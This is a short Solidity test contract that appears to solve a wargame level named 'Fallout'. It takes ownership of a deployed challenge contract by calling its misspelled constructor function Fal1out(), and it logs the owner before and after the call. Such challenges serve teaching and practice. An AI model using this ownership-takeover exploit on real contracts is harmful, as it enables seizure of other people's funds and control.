// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../custom_lib/Test.sol";
import "../instances/IFal1out.sol";
import "../custom_lib/Console.sol";

contract Attacker is Test, Console {
    Fallout level02 = Fallout(payable(0x6Ee8150e6CA63d1D7b376D10a50DCb92Ec046237));

    function test() external {

        log("Caller:", msg.sender);
        log("Owner:", level02.owner());
        level02.Fal1out();
        log("New owner", level02.owner());

    }
}